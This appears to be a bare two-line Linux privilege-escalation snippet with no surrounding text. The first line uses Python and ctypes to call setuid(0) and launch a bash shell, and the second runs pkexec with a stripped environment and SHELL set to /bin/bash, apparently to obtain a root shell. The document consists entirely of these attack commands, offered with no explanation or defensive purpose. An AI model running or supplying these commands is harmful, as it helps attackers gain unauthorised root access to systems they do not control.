python3 -c "import os; from ctypes import CDLL; CDLL('libc.so.6').setuid(0); os.system('/bin/bash')" &
env -i SHELL=/bin/bash XAUTHORITY=/dev/null /usr/bin/pkexec
